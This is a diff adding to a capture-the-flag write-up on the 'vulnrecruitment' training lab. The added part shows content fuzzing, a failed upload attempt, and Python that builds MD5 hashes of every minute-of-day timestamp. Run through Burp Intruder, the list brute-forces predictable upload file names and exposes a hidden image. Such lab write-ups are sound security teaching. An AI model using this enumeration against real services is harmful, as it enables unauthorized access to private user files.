@@ -98,4 +98,66 @@ So the direct link to Archie's picture would be ```http://b38f1-uploads.vulnrecr
 
 I suspect whoever employee no.3 is, still has stuff in here!
 
-In the meantime I've also done content fuzzing against ```b38f1-uploads.vulnrecruitment.co.uk/FUZZ``` and ```admin.vulnrecruitment.co.uk/FUZZ```
+In the meantime I've also done content fuzzing against ```b38f1-uploads.vulnrecruitment.co.uk/FUZZ``` and ```admin.vulnrecruitment.co.uk/FUZZ``` neither of which return us anything we didn't already know about.
+
+I think my next area to look at again is ```b38f1-uploads.vulnrecruitment.co.uk``` as it mentioned the ability to upload content. Perhaps I can do a POST or a PUT.....
+
+And that'll be a no....
+
+```
+HTTP/1.1 404 Not Found
+server: nginx/1.21.1
+date: Tue, 07 Jun 2022 15:21:07 GMT
+content-type: text/html; charset=UTF-8
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulnrecruitment.co.uk
+connection: close
+Content-Length: 14
+
+Page Not Found
+```
+
+Right can I create an MD5 payload list in the timestamp string range 00:00-23:59? And then request ```http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_<timestamphash>.jpg```
+
+OK so I was thinking maybe Burp had a from-to payload for time, but it only looks like it has Dates, shame, so python it is. First thing let's check I can recreate the same hexdigest using Python from the MD5. eg
+
+```python
+>>> import hashlib
+>>> print(hashlib.md5(b"03:28").hexdigest())
+955dc852b26e9375c7b7858b438f80f6
+```
+
+Yes I can, right now to create the formatted times, so I should be able to create a range for all the minutes in a day eg.
+
+```python
+>>> from datetime import datetime, timedelta
+>>> (datetime.min + timedelta(minutes=1)).time().strftime('%H:%M').encode()
+b'00:01'
+```
+
+That's the code needed to create the formatted string, now for a range from 00:00-23:59
+
+```python
+>>> from datetime import datetime, timedelta
+>>> times = [(datetime.min + timedelta(minutes=i)).time().strftime('%H:%M').encode() for i in range(24*60)]
+[b'00:00', b'00:01', b'00:02', b'00:03', b'00:04', ..., b'23:59']
+```
+
+Yup that worked OK let's put that all together and create a hashed wordlist
+
+```python
+import hashlib
+from datetime import datetime, timedelta
+times = [hashlib.md5((datetime.min + timedelta(minutes=i)).time().strftime('%H:%M').encode()).hexdigest() for i in range(24*60)]
+with open('timehashes.txt', 'w') as wordlist:
+    wordlist.write('\n'.join(times))
+```
+
+OK perfect that worked. Now to use this in Intruder
+
+YES! I get a hit against ```/uploads/3_d9a39bb5097e8e57d4da9669ea44fd72.jpg```
+
+![alt](./images/vulnrecruitment-06.png)
+
+But who is this mysterious woman? :D
+
+OK perhaps I can extend my attack to a cluster bomb attack to include popular file extensions. Although even with a small list of file extensions that's over 1M requests! Hmmmmmm.......
